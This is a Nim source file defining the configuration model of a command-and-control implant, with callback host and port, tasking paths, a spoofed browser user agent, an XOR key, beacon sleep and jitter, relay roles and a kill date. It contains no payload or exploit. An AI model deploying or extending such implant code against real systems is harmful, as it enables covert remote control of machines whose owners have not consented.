#[
    Domain Model: Implant
    Represents the implant entity with its configuration and state
]#

import times
import ./network_command_context

type
    ImplantRole* = enum
        STANDARD
        RELAY_CLIENT
        RELAY_SERVER
    
    Implant* = object
        id*: string                    # Unique implant ID assigned by C2
        initialized*: bool            # Whether implant is initialized
        registered*: bool             # Whether implant is registered with C2
        role*: ImplantRole            # Implant role (STANDARD, RELAY_CLIENT, RELAY_SERVER)
        
        # C2 Server Configuration
        listenerType*: string         # Listener type (HTTP, HTTPS, etc.)
        listenerHost*: string         # Listener hostname
        implantCallbackIp*: string    # C2 server IP
        listenerPort*: string          # C2 server port
        
        # HTTP Paths
        registerPath*: string         # Registration endpoint path
        taskPath*: string             # Task polling endpoint path
        resultPath*: string           # Result submission endpoint path
        reconnectPath*: string        # Reconnection endpoint path
        
        # Communication Settings
        userAgent*: string            # User agent string
        httpAllowCommunicationKey*: string  # Authentication key
        uniqueXorKey*: string         # Unique encryption key from C2
        
        # Operational Settings
        sleepTime*: int               # Sleep interval in seconds
        sleepJitter*: float           # Sleep jitter percentage
        killDate*: string             # Kill date (expiration)

proc newImplant*(): Implant =
    ## Create a new uninitialized Implant instance
    result = Implant(
        id: "",
        initialized: false,
        registered: false,
        role: STANDARD,
        listenerType: "HTTP",
        listenerHost: "",
        implantCallbackIp: "127.0.0.1",
        listenerPort: "80",
        registerPath: "/register",
        taskPath: "/task",
        resultPath: "/result",
        reconnectPath: "/reconnect",
        userAgent: "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
        httpAllowCommunicationKey: "DefaultKey123",
        uniqueXorKey: "",
        sleepTime: 10,
        sleepJitter: 0.0,
        killDate: ""
    )

proc isExpired*(implant: Implant): bool =
    ## Check if implant has expired based on killDate
    if implant.killDate == "":
        return false
    
    try:
        let killDateTime = parse(implant.killDate, "yyyy-MM-dd")
        let currentDateTime = now()
        # Compare dates (year, month, day only)
        if currentDateTime.year > killDateTime.year:
            return true
        elif currentDateTime.year == killDateTime.year:
            if currentDateTime.month > killDateTime.month:
                return true
            elif currentDateTime.month == killDateTime.month:
                return currentDateTime.monthday > killDateTime.monthday
        return false
    except:
        return false

proc isRelayMode*(implant: Implant): bool =
    ## Check if implant is in relay mode
    return implant.role == RELAY_CLIENT or implant.role == RELAY_SERVER

proc toNetworkContext*(implant: Implant): NetworkCommandContext =
    ## Convert Implant to NetworkCommandContext for network commands
    ## This allows network modules to depend only on what they need
    result = NetworkCommandContext(
        userAgent: implant.userAgent,
        id: implant.id,
        httpAllowCommunicationKey: implant.httpAllowCommunicationKey,
        uniqueXorKey: implant.uniqueXorKey,
        listenerType: implant.listenerType,
        listenerHost: implant.listenerHost,
        implantCallbackIp: implant.implantCallbackIp,
        listenerPort: implant.listenerPort,
        taskPath: implant.taskPath
    )

